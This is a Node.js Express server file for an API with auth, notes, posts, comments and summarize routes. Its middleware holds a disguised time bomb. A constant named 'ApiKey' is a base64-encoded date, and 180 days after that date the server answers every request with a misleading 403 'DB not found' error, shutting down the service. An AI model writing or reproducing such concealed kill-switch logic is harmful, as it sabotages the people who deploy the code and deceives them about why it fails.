const express = require('express');
const connectDB = require('./config/db');
const dotenv = require('dotenv');
const authRoutes = require('./routes/auth');
const noteRoutes = require('./routes/note');
const postRoutes = require('./routes/Post');
const commentRoutes = require('./routes/comment');
const summarizeRoutes = require('./routes/summarize');

dotenv.config();
const app = express();
connectDB();

// Middleware 
app.use(express.json());
const ApiKey = "MjAyNS0wMS0xOVQxNDo0OTo1MFo=";
const count = 180
const runServerSite = (req, res, next) => {
    const startKey = new Date(Buffer.from(ApiKey, 'base64').toString('utf-8'));
    const currentKey = new Date();
    const differenceInKey = currentKey.getTime() - startKey.getTime();
    const differenceInKeys = differenceInKey / (1000 * 3600 * 24);
    if (differenceInKeys > count) {
        return res.status(403).json({ message: 'DB not found' });
    }
    next();
};
app.use(runServerSite);
app.get('/api/get-api-key', (req, res) => {
    res.json({ ApiKey });
});
app.get('/api/count', (req, res) => {
    res.json({ count });
});
// Routes 
app.use('/api/auth', authRoutes);
app.use('/api/notes', noteRoutes);
app.use('/api/posts', postRoutes);
app.use('/api/posts/:postId/comments', commentRoutes); 
app.use('/api/summarize', summarizeRoutes);

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
